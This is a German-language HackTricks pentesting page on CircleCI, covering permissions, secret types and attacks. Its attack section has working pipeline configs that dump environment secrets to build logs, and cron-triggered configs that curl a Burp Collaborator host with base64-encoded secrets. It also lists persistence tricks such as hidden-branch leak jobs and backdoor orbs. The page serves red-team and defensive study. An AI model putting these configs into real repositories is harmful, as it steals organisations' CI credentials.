# CircleCI Sicherheit

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

### Grundinformationen

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) ist eine Continuous Integration-Plattform, auf der du **Vorlagen definieren** kannst, die angeben, was du mit einem Code tun m√∂chtest und wann. So kannst du **Tests** oder **Deployments** direkt **aus deinem Repo-Master-Branch** automatisieren.

### Berechtigungen

**CircleCI** **erbt die Berechtigungen** von GitHub und Bitbucket, die mit dem **Konto** verbunden sind, das sich anmeldet.\
In meinen Tests habe ich √ºberpr√ºft, dass du, solange du **Schreibberechtigungen f√ºr das Repo in GitHub** hast, in der Lage bist, **die Projekteinstellungen in CircleCI zu verwalten** (neue SSH-Schl√ºssel festzulegen, Projekt-API-Schl√ºssel zu erhalten, neue Branches mit neuen CircleCI-Konfigurationen zu erstellen...).

Du musst jedoch ein **Repo-Administrator** sein, um **das Repo in ein CircleCI-Projekt umzuwandeln**.

### Umgebungsvariablen & Geheimnisse

Laut [**den Dokumenten**](https://circleci.com/docs/2.0/env-vars/) gibt es verschiedene M√∂glichkeiten, **Werte in Umgebungsvariablen** innerhalb eines Workflows zu **laden**.

#### Eingebaute Umgebungsvariablen

Jeder von CircleCI ausgef√ºhrte Container hat immer [**spezifische Umgebungsvariablen, die in der Dokumentation definiert sind**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) wie `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` oder `CIRCLE_USERNAME`.

#### Klartext

Du kannst sie im Klartext innerhalb eines **Befehls** deklarieren:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Sie k√∂nnen sie im Klartext innerhalb der **run environment** deklarieren:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Sie k√∂nnen sie im Klartext innerhalb der **build-job environment** deklarieren:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Sie k√∂nnen sie im Klartext innerhalb der **Umgebung eines Containers** deklarieren:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
#### Projektgeheimnisse

Dies sind **Geheimnisse**, die nur vom **Projekt** (von **irgendeinem Branch**) **zug√§nglich** sind.\
Sie k√∂nnen sie **deklariert in** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ sehen.

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
Die Funktionalit√§t "**Variablen importieren**" erm√∂glicht es, **Variablen aus anderen Projekten** in dieses zu **importieren**.
{% endhint %}

#### Kontextgeheimnisse

Dies sind Geheimnisse, die **organisationsweit** sind. Standardm√§√üig kann **jedes Repo** auf **jedes Geheimnis** zugreifen, das hier gespeichert ist:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Beachten Sie jedoch, dass eine andere Gruppe (anstatt aller Mitglieder) **ausgew√§hlt werden kann, um den Zugriff auf die Geheimnisse nur bestimmten Personen zu gew√§hren**.\
Dies ist derzeit eine der besten M√∂glichkeiten, um die **Sicherheit der Geheimnisse** zu **erh√∂hen**, indem nicht jeder Zugriff darauf hat, sondern nur einige Personen.
{% endhint %}

### Angriffe

#### Suche nach Klartextgeheimnissen

Wenn Sie **Zugriff auf das VCS** (wie GitHub) haben, √ºberpr√ºfen Sie die Datei `.circleci/config.yml` von **jedem Repo in jedem Branch** und **suchen** Sie nach potenziellen **Klartextgeheimnissen**, die dort gespeichert sind.

#### Geheim-Umgebungsvariablen & Kontextenumeration

Durch √úberpr√ºfung des Codes k√∂nnen Sie **alle Geheimnisnamen** finden, die in jeder `.circleci/config.yml`-Datei **verwendet** werden. Sie k√∂nnen auch die **Kontextnamen** aus diesen Dateien abrufen oder sie in der Webkonsole √ºberpr√ºfen: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

#### Exfiltrieren von Projektgeheimnissen

{% hint style="warning" %}
Um **ALLE** Projekt- und Kontext-**GEHEIMNISSE** zu **exfiltrieren**, m√ºssen Sie **nur** **SCHREIBZUGRIFF** auf **nur 1 Repo** in der gesamten GitHub-Organisation haben (_und Ihr Konto muss Zugriff auf die Kontexte haben, aber standardm√§√üig kann jeder auf jeden Kontext zugreifen_).
{% endhint %}

{% hint style="danger" %}
Die Funktionalit√§t "**Variablen importieren**" erm√∂glicht es, **Variablen aus anderen Projekten** in dieses zu **importieren**. Daher k√∂nnte ein Angreifer **alle Projektvariablen aus allen Repos importieren** und dann **alle zusammen exfiltrieren**.
{% endhint %}

Alle Projektgeheimnisse werden immer in der Umgebung der Jobs festgelegt, sodass das einfache Aufrufen von env und das Obfuskieren in base64 die Geheimnisse in der **Webprotokollkonsole der Workflows** exfiltriert:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Wenn Sie **keinen Zugriff auf die Webkonsole** haben, aber **Zugriff auf das Repo** haben und wissen, dass CircleCI verwendet wird, k√∂nnen Sie einfach **einen Workflow erstellen**, der **jede Minute ausgel√∂st wird** und der **die Geheimnisse an eine externe Adresse exfiltriert**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
#### Exfiltriere Kontextgeheimnisse

Du musst **den Kontextnamen angeben** (dies wird auch die Projektgeheimnisse exfiltrieren):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Wenn Sie **keinen Zugriff auf die Webkonsole** haben, aber **Zugriff auf das Repository** haben und wissen, dass CircleCI verwendet wird, k√∂nnen Sie einfach **einen Workflow √§ndern**, der **jede Minute ausgel√∂st wird** und der **die Geheimnisse an eine externe Adresse exfiltriert**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Das Erstellen einer neuen `.circleci/config.yml` in einem Repo **reicht nicht aus, um einen CircleCI-Build auszul√∂sen**. Sie m√ºssen **es als Projekt in der CircleCI-Konsole aktivieren**.
{% endhint %}

#### Escape to Cloud

**CircleCI** bietet Ihnen die M√∂glichkeit, **Ihre Builds auf ihren Maschinen oder auf Ihren eigenen auszuf√ºhren**.\
Standardm√§√üig befinden sich ihre Maschinen in GCP, und anfangs werden Sie nichts Relevantes finden k√∂nnen. Wenn ein Opfer jedoch die Aufgaben auf **seinen eigenen Maschinen (m√∂glicherweise in einer Cloud-Umgebung)** ausf√ºhrt, k√∂nnten Sie einen **Cloud-Metadaten-Endpunkt mit interessanten Informationen darauf** finden.

Beachten Sie, dass in den vorherigen Beispielen alles innerhalb eines Docker-Containers gestartet wurde, aber Sie k√∂nnen auch **bitten, eine VM-Maschine zu starten** (die m√∂glicherweise unterschiedliche Cloud-Berechtigungen hat):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Oder sogar ein Docker-Container mit Zugriff auf einen Remote-Docker-Dienst:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
#### Persistenz

* Es ist m√∂glich, **Benutzertokens in CircleCI** zu erstellen, um auf die API-Endpunkte mit dem Zugriff des Benutzers zuzugreifen.
* _https://app.circleci.com/settings/user/tokens_
* Es ist m√∂glich, **Projekttokens** zu erstellen, um auf das Projekt mit den dem Token gegebenen Berechtigungen zuzugreifen.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Es ist m√∂glich, **SSH-Schl√ºssel** zu den Projekten hinzuzuf√ºgen.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Es ist m√∂glich, **einen Cron-Job in einem versteckten Branch** in einem unerwarteten Projekt zu erstellen, der jeden Tag alle **Kontext-Umgebungsvariablen** **leakt**.
* Oder sogar in einem Branch zu erstellen / einen bekannten Job zu modifizieren, der jeden Tag alle Kontext- und **Projektheimlichkeiten** **leakt**.
* Wenn Sie ein GitHub-Besitzer sind, k√∂nnen Sie **unverifizierte Orbs** zulassen und einen in einem Job als **Hintert√ºr** konfigurieren.
* Sie k√∂nnen eine **Befehlsinjektionsanf√§lligkeit** in einigen Aufgaben finden und **Befehle** √ºber ein **Geheimnis** injizieren, indem Sie dessen Wert √§ndern.

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
